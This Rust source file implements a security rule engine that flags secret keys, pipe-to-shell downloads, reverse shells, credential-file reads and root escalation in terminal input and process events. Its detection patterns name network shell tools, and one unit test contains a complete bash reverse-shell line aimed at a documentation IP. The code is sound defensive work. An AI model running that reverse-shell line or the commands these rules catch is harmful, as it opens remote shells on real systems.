use argus_common::events::{AuditEvent, KeystrokeInput, ProcessExec, SecurityEventKind, Severity};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AnomalyAlert {
    pub severity: Severity,
    pub kind: SecurityEventKind,
    pub description: String,
    pub evidence: String,
}

pub struct RuleEngine;

impl RuleEngine {
    /// Inspect a keystroke or paste event for secret leaks and suspicious patterns
    pub fn inspect_input(input: &KeystrokeInput) -> Vec<AnomalyAlert> {
        let mut alerts = Vec::new();
        let text = input.as_str_lossy();

        // 1. Secret Leak Detections
        if text.contains("BEGIN OPENSSH PRIVATE KEY")
            || text.contains("BEGIN RSA PRIVATE KEY")
            || text.contains("BEGIN PRIVATE KEY")
        {
            alerts.push(AnomalyAlert {
                severity: Severity::Critical,
                kind: SecurityEventKind::SensitiveFileWrite,
                description: "Private SSH/TLS key pasted into terminal stdin".to_string(),
                evidence: "Found 'BEGIN PRIVATE KEY' block in input".to_string(),
            });
        }

        if text.contains("AWS_SECRET_ACCESS_KEY")
            || text.contains("AKIA")
            || text.contains("ghp_")
            || text.contains("sk-proj-")
        {
            alerts.push(AnomalyAlert {
                severity: Severity::High,
                kind: SecurityEventKind::SensitiveFileWrite,
                description: "Cloud/API Secret Key detected in terminal input".to_string(),
                evidence: "Matching secret pattern (AWS/GitHub/OpenAI Token)".to_string(),
            });
        }

        // 2. Suspicious Command Execution Patterns in Stdin
        if text.contains("curl ") && text.contains("| sh")
            || text.contains("curl ") && text.contains("| bash")
            || text.contains("wget ") && text.contains("| sh")
            || text.contains("wget ") && text.contains("| bash")
        {
            alerts.push(AnomalyAlert {
                severity: Severity::High,
                kind: SecurityEventKind::PrivilegeEscalationAttempt,
                description: "Remote script execution via pipe to shell (curl/wget | sh)"
                    .to_string(),
                evidence: text.to_string(),
            });
        }

        if text.contains("/dev/tcp/") || text.contains("nc -e") || text.contains("ncat -e") {
            alerts.push(AnomalyAlert {
                severity: Severity::Critical,
                kind: SecurityEventKind::OutboundC2Attempt,
                description: "Potential reverse shell payload detected in input".to_string(),
                evidence: text.to_string(),
            });
        }

        // 3. Interactive Root Privilege Escalation Patterns
        let trimmed_lower = text.trim().to_lowercase();
        if trimmed_lower.starts_with("sudo su")
            || trimmed_lower.starts_with("sudo -i")
            || trimmed_lower.starts_with("sudo -s")
            || trimmed_lower.starts_with("sudo /bin/bash")
            || trimmed_lower.starts_with("sudo /bin/zsh")
            || trimmed_lower.starts_with("sudo /bin/sh")
            || trimmed_lower.starts_with("su -")
            || trimmed_lower.starts_with("su root")
            || trimmed_lower == "su"
        {
            alerts.push(AnomalyAlert {
                severity: Severity::Medium,
                kind: SecurityEventKind::PrivilegeEscalationAttempt,
                description: "Interactive root shell escalation executed (sudo su / -i / su)"
                    .to_string(),
                evidence: text.trim().to_string(),
            });
        }

        alerts
    }

    /// Inspect a process execution event for tampering or escalation
    pub fn inspect_process(exec: &ProcessExec) -> Vec<AnomalyAlert> {
        let mut alerts = Vec::new();
        let cmdline = exec.argv.join(" ");

        if exec.comm == "insmod" || exec.comm == "rmmod" || exec.comm == "modprobe" {
            alerts.push(AnomalyAlert {
                severity: Severity::Critical,
                kind: SecurityEventKind::KernelModuleLoad,
                description: format!("Kernel module operation executed: {}", exec.comm),
                evidence: cmdline.clone(),
            });
        }

        if cmdline.contains("/etc/shadow") || cmdline.contains("/etc/sudoers") {
            alerts.push(AnomalyAlert {
                severity: Severity::High,
                kind: SecurityEventKind::SensitiveFileRead,
                description: "Sensitive system credential file accessed".to_string(),
                evidence: cmdline.clone(),
            });
        }

        if exec.comm == "su"
            || (exec.comm == "sudo"
                && (cmdline.contains("-i")
                    || cmdline.contains("-s")
                    || cmdline.contains("su")
                    || cmdline.contains("bash")
                    || cmdline.contains("zsh")))
        {
            alerts.push(AnomalyAlert {
                severity: Severity::Medium,
                kind: SecurityEventKind::PrivilegeEscalationAttempt,
                description: "Root shell escalation process executed".to_string(),
                evidence: cmdline,
            });
        }

        alerts
    }

    /// Inspect any audit event
    pub fn inspect_event(event: &AuditEvent) -> Vec<AnomalyAlert> {
        match event {
            AuditEvent::KeystrokeInput(key) => Self::inspect_input(key),
            AuditEvent::ProcessExec(proc) => Self::inspect_process(proc),
            _ => Vec::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    #[test]
    fn test_secret_detection() {
        let input = KeystrokeInput::new(
            Uuid::new_v4(),
            1,
            100,
            b"export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n".to_vec(),
            true,
        );

        let alerts = RuleEngine::inspect_input(&input);
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].severity, Severity::High);
    }

    #[test]
    fn test_reverse_shell_detection() {
        let input = KeystrokeInput::new(
            Uuid::new_v4(),
            1,
            100,
            b"bash -i >& /dev/tcp/198.51.100.2/4444 0>&1\n".to_vec(),
            false,
        );

        let alerts = RuleEngine::inspect_input(&input);
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].severity, Severity::Critical);
        assert_eq!(alerts[0].kind, SecurityEventKind::OutboundC2Attempt);
    }

    #[test]
    fn test_root_escalation_detection() {
        let input = KeystrokeInput::new(Uuid::new_v4(), 1, 100, b"sudo su -\n".to_vec(), false);

        let alerts = RuleEngine::inspect_input(&input);
        assert_eq!(alerts.len(), 1);
        assert_eq!(
            alerts[0].kind,
            SecurityEventKind::PrivilegeEscalationAttempt
        );
        assert!(alerts[0].description.contains("root shell escalation"));
    }
}
